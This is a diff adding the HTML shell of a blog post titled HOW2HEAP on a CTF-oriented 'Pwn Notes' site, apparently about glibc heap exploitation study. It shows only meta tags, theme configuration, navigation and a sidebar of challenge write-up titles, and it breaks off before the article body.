@@ -1,0 +1,1712 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/pwn-notes/img/fluid.png">
+  <link rel="icon" href="/pwn-notes/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="henan808">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2.23（部分）fastbin_dump123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;  fprintf(stderr, &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HOW2HEAP">
+<meta property="og:url" content="https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/index.html">
+<meta property="og:site_name" content="Pwn Notes">
+<meta property="og:description" content="2.23（部分）fastbin_dump123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;  fprintf(stderr, &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183522092.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183627665.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183748075.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183851996.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183934946.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027184708700.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027184957833.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027185638062.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027194200212.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027194637072.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027194826915.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027194916118.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027195013744.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027195129358.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027195623280.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027195807843.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027195921605.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027204750354.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027204931085.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205028965.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205148806.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205243894.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205523134.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205718737.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205743194.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027205844207.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027210026081.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027211140248.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027211242376.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027211349629.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027211441213.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212251212.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212701087.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212728784.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212748094.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212833357.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027212922598.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028103837602.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104220458.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104325734.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104354983.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104602563.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104710928.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028111924432.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104836598.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028104910324.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028112954764.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028113116376.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028113556663.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028113744757.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028113844704.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028113930492.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028114229310.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028114804832.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028115346751.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028115414287.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028115450441.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028151922821.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028152912666.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028152945959.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153103287.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153239486.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153257103.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153508489.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153723098.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028153849818.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028154549845.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028155115270.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028155324955.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028163551997.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028174812894.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261028175519431.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029144743903.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029150024128.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029150856724.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029151024898.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029151116123.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029151244533.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029152822009.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029153046744.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029153330702.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029153621529.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029153704557.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029154646723.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029155946398.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261029163320021.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031103616274.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031104441800.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031104816213.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031110714763.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031111531658.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031111858342.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031112155237.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031112230857.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031112307913.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031122038219.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031122203741.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031122705021.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031122827004.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031155157719.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031161050242.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031161501216.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031162531704.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031164746229.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261031170158895.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102100613877.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102100805816.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102101149747.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102103317798.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102103816165.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102104726964.png">
+<meta property="og:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261102104758758.png">
+<meta property="article:published_time" content="2026-11-13T11:08:05.000Z">
+<meta property="article:modified_time" content="2026-11-13T11:25:07.953Z">
+<meta property="article:author" content="henan808">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="unsorted-bin">
+<meta property="article:tag" content="double-free">
+<meta property="article:tag" content="HouseOfSpirit">
+<meta property="article:tag" content="malloc-consolidate">
+<meta property="article:tag" content="glibc2.35">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://henan808.github.io/pwn-notes/images/notes/image-20261027183522092.png">
+  
+  
+  
+  <title>HOW2HEAP - Pwn Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/pwn-notes/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/pwn-notes/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/pwn-notes/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"henan808.github.io","root":"/pwn-notes/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/pwn-notes/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/pwn-notes/js/utils.js" ></script>
+  <script  src="/pwn-notes/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/pwn-notes/">
+      <strong>Pwn Notes</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/pwn-notes/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/pwn-notes/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/pwn-notes/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HOW2HEAP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        henan808
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-13 19:08" pubdate>
+          2026-11-13 19:08
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          115 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="题目复现"
+        id="heading-c24904fafdedd94cae3329cab43afa2f" role="tab" data-toggle="collapse" href="#collapse-c24904fafdedd94cae3329cab43afa2f"
+        aria-expanded="true"
+      >
+        题目复现
+        <span class="list-group-count">(13)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-c24904fafdedd94cae3329cab43afa2f"
+           role="tabpanel" aria-labelledby="heading-c24904fafdedd94cae3329cab43afa2f">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="0CTF"
+        id="heading-66ee23ad3c83a69ba427b948ca811936" role="tab" data-toggle="collapse" href="#collapse-66ee23ad3c83a69ba427b948ca811936"
+        aria-expanded="false"
+      >
+        0CTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-66ee23ad3c83a69ba427b948ca811936"
+           role="tabpanel" aria-labelledby="heading-66ee23ad3c83a69ba427b948ca811936">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-0ctf2017babyheap-9d78ba/" title="0ctf2017babyheap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">0ctf2017babyheap</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CISCN"
+        id="heading-85d4b39991e6d793b4caecd8f57b316e" role="tab" data-toggle="collapse" href="#collapse-85d4b39991e6d793b4caecd8f57b316e"
+        aria-expanded="false"
+      >
+        CISCN
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-85d4b39991e6d793b4caecd8f57b316e"
+           role="tabpanel" aria-labelledby="heading-85d4b39991e6d793b4caecd8f57b316e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn2019final3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/10/imported-ciscn_2019_final_3/" title="ciscn_2019_final_3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn_2019_final_3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/ciscn-2019-final-3-leak-techniques/" title="ciscn_2019_final_3：四种流派怎么泄露 libc"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ciscn_2019_final_3：四种流派怎么泄露 libc</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HITCON"
+        id="heading-8f64721be0067542591093019292b028" role="tab" data-toggle="collapse" href="#collapse-8f64721be0067542591093019292b028"
+        aria-expanded="false"
+      >
+        HITCON
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8f64721be0067542591093019292b028"
+           role="tabpanel" aria-labelledby="heading-8f64721be0067542591093019292b028">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcon2018childrentcache（off by null）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcontrainingmagicheap-5861ae/" title="hitcontrainingmagicheap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcontrainingmagicheap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcontraininguaf-8aa533/" title="hitcontraininguaf"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">hitcontraininguaf</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="RoarCTF"
+        id="heading-d25d9658953f4c8222b2c810b44b34c6" role="tab" data-toggle="collapse" href="#collapse-d25d9658953f4c8222b2c810b44b34c6"
+        aria-expanded="false"
+      >
+        RoarCTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-d25d9658953f4c8222b2c810b44b34c6"
+           role="tabpanel" aria-labelledby="heading-d25d9658953f4c8222b2c810b44b34c6">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/12/imported-roarctf2019_easyheap/" title="RoarCTF 2019] easyheap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">RoarCTF 2019] easyheap</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="V&amp;N"
+        id="heading-2cc4225f9e41bb83720f2a02687f6b3f" role="tab" data-toggle="collapse" href="#collapse-2cc4225f9e41bb83720f2a02687f6b3f"
+        aria-expanded="false"
+      >
+        V&amp;N
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-2cc4225f9e41bb83720f2a02687f6b3f"
+           role="tabpanel" aria-labelledby="heading-2cc4225f9e41bb83720f2a02687f6b3f">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-v-n2020-easytheap-8e50cf/" title="[V&amp;N2020 公开赛]easyTHeap（差一步美满）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">[V&amp;N2020 公开赛]easyTHeap（差一步美满）</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ZJCTF"
+        id="heading-8f47a34f247fa00f3cd88b8de2501992" role="tab" data-toggle="collapse" href="#collapse-8f47a34f247fa00f3cd88b8de2501992"
+        aria-expanded="false"
+      >
+        ZJCTF
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8f47a34f247fa00f3cd88b8de2501992"
+           role="tabpanel" aria-labelledby="heading-8f47a34f247fa00f3cd88b8de2501992">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-1-uaf-a9fd52/" title="1.UAF"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">1.UAF</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="how2heap"
+        id="heading-cb2e4d263aaf34eb3434a52d5117c509" role="tab" data-toggle="collapse" href="#collapse-cb2e4d263aaf34eb3434a52d5117c509"
+        aria-expanded="true"
+      >
+        how2heap
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-cb2e4d263aaf34eb3434a52d5117c509"
+           role="tabpanel" aria-labelledby="heading-cb2e4d263aaf34eb3434a52d5117c509">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/" title="HOW2HEAP"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HOW2HEAP</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
